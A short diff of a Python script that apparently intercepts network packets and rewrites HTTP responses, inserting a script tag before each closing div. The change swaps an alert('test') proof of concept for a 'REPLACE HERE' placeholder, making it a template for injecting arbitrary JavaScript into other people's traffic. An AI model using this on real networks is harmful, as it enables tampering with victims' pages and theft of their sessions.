@@ -32,7 +32,7 @@ def process_packet(packet):
         print("[+] HTTP Response")
 
         # JavaScript injection payload
-        injection_code = b"<script>alert('test');</script></div>"
+        injection_code = b"<script>REPLACE HERE;</script></div>"
         # Inject the code before the closing </div> tag
         load = load.replace(b"</div>", injection_code)
 
